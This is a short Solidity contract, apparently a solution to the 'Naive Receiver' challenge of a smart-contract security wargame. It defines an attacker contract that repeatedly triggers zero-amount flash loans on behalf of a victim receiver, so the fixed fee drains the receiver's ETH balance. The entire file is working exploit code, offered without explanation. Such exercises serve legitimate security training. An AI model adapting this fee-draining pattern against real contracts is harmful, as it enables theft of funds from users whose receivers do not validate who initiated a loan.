// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function  flashLoan(address borrower, uint256 borrowAmount) external ;
        
}

contract NaiveReceiverAttacker {
    using Address for address payable;

    function attack(INaiveReceiverLenderPool pool, address payable receiver) external {
        uint256 fixedFee = INaiveReceiverLenderPool(pool).fixedFee();
        while(receiver.balance >= fixedFee) {
            pool.flashLoan(receiver, 0);
        }
    }
}